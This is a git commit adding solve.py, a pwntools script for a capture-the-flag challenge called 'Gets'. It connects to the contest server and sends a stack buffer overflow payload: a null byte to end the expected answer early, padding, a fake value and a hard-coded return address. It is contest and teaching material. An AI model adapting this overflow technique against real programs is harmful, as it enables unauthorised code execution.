61ef9df8a8b4f2a37e8835f7f089bdb385918d1c
xenonminer <46347858+xenonminer@users.noreply.github.com>
2021-07-22 20:01:47 -0700

    Update solve.py

--- pwn/Gets/solve.py
+++ pwn/Gets/solve.py
@@ -1,1 +1,23 @@
+from pwn import *
 
+exe = ELF("gets")
+
+context.binary = exe
+
+
+def conn():
+        if False:
+                return process([exe.path])
+        else:
+                return remote("gets.litctf.live", 1337)
+
+
+def main():
+        r = conn()
+        r.recvuntil("Are you starting to understand?")
+        r.sendline(b'Yes' + b'\0' + b'A'*36 + p64(0xdeadbeef) + p64(0x7ffff7fb1390))
+        r.interactive()
+
+
+if __name__ == "__main__":
+        main()
